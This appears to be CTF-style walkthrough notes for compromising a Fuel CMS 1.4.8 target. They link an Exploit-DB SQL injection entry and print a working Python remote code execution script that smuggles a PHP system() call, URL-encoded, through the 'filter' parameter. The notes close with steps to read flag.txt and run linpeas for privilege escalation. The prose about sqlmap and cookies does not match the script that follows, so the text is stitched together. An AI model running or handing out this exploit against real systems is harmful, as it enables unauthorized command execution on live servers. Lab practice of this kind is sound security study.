[Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/48778)

Excellent, you have the authenticated cookies. Now we can tell sqlmap to use them so it can reach the target page behind the login.

Because the injection point is likely the number 1 at the end of the URL path, we will use an asterisk (*) to tell sqlmap exactly where to test.

```python
import requests
import urllib.parse

# CHANGE 1: Update the target IP to your victim
url = "http://10.112.150.68" 

def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while True:
    # CHANGE 2: Changed raw_input to input for Python 3
    xxxx = input('cmd: ')
    
    # The payload uses a PHP evaluation vulnerability in the 'filter' parameter
    payload = urllib.parse.quote(xxxx)
    burp0_url = f"{url}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{payload}%27%29%2b%27"
    
    # CHANGE 3: Remove or comment out proxies unless you have Burp Suite open
    # proxy = {"http":"http://127.0.0.1:8080"}
    
    try:
        # If not using Burp, remove the 'proxies=proxy' part
        r = requests.get(burp0_url, verify=False)

        # Parsing logic to clean up the output
        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text, begin, 2)

        print(r.text[0:dup])
    except Exception as e:
        print(f"Error: {e}")
```
go to /home/www-data to find the flag.txt. 

```bash
chmod +x linpeas.sh
./linpeas.sh
```
